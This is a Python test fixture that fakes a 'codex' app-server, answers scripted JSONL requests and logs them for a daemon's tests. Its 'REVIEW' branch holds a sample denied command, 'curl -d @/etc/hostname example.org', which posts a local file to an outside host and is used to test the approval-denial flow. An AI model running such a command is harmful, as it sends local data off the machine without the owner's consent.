"""A stand-in `codex` for tests: `--version` and a scripted `app-server` (JSONL on stdio).

Every request is appended to $FAKE_CODEX_LOG (one JSON per line) so tests can assert on
what the daemon sent. A turn whose text is "CRASH" makes the server exit.
"""
import itertools
import json
import os
import sys

LOG = os.environ.get("FAKE_CODEX_LOG")
MODELS = [
    {"id": "model-a", "displayName": "Model A", "isDefault": True, "defaultReasoningEffort": "low",
     "supportedReasoningEfforts": [{"reasoningEffort": e} for e in ("low", "medium", "high")]},
    {"id": "model-b", "displayName": "Model B", "isDefault": False, "defaultReasoningEffort": "medium",
     "supportedReasoningEfforts": [{"reasoningEffort": e} for e in ("medium", "high")]},
]
ids = itertools.count(1)


def out(obj):
    sys.stdout.write(json.dumps(obj) + "\n")
    sys.stdout.flush()


def note(method, params):
    out({"method": method, "params": params})


def main():
    if "--version" in sys.argv:
        print(os.environ.get("FAKE_CODEX_VERSION", "codex-cli 0.166.0"))
        return
    threads = 0
    for line in sys.stdin:
        req = json.loads(line)
        if LOG:
            with open(LOG, "a") as fh:
                fh.write(json.dumps(req) + "\n")
        if "id" not in req:
            continue
        method, params, rid = req["method"], req.get("params", {}), req["id"]
        if method == "initialize":
            out({"id": rid, "result": {"userAgent": "fake"}})
        elif method == "model/list":
            out({"id": rid, "result": {"data": MODELS}})
        elif method == "thread/start" and os.environ.get("FAKE_FAIL_THREAD_START"):
            out({"id": rid, "error": {"code": -1, "message": "not signed in"}})
        elif method == "thread/start":
            threads += 1
            tid = f"thread-{threads}"
            out({"id": rid, "result": {"thread": {"id": tid, "model": params.get("model", "model-a"),
                                                   "reasoningEffort": "low"}, "model": params.get("model", "model-a")}})
        elif method in ("thread/settings/update", "thread/realtime/stop", "thread/approveGuardianDeniedAction"):
            out({"id": rid, "result": {}})
        elif method == "turn/start":
            text = params["input"][0]["text"]
            if text == "CRASH":
                sys.exit(1)
            tid = params["threadId"]
            out({"id": rid, "result": {"turn": {"id": f"turn-{next(ids)}"}}})
            note("turn/started", {"threadId": tid, "turn": {"id": "t"}})
            note("item/completed", {"threadId": tid, "item": {
                "type": "userMessage", "clientId": params.get("clientUserMessageId"),
                "content": [{"type": "text", "text": text}]}})
            if text == "DELEGATION":
                note("item/completed", {"threadId": tid, "item": {
                    "type": "userMessage", "clientId": None,
                    "content": [{"type": "text", "text": "<realtime_delegation> <input>count repos</input> </realtime_delegation>"}]}})
            if text == "REVIEW":
                note("item/autoApprovalReview/completed", {
                    "threadId": tid, "reviewId": "rev-1", "review": {"status": "denied", "riskLevel": "high",
                                                                     "rationale": "would send data off the machine"},
                    "action": {"type": "command", "command": "curl -d @/etc/hostname example.org"}})
            note("item/completed", {"threadId": tid, "item": {
                "type": "commandExecution", "command": "ls", "status": "completed", "exitCode": 0}})
            note("item/completed", {"threadId": tid, "item": {
                "type": "agentMessage", "phase": "final_answer", "text": f"done: {text}"}})
            note("turn/completed", {"threadId": tid, "turn": {"id": "t", "error": None}})
        else:
            out({"id": rid, "error": {"code": -32601, "message": f"fake: {method} not implemented"}})


main()
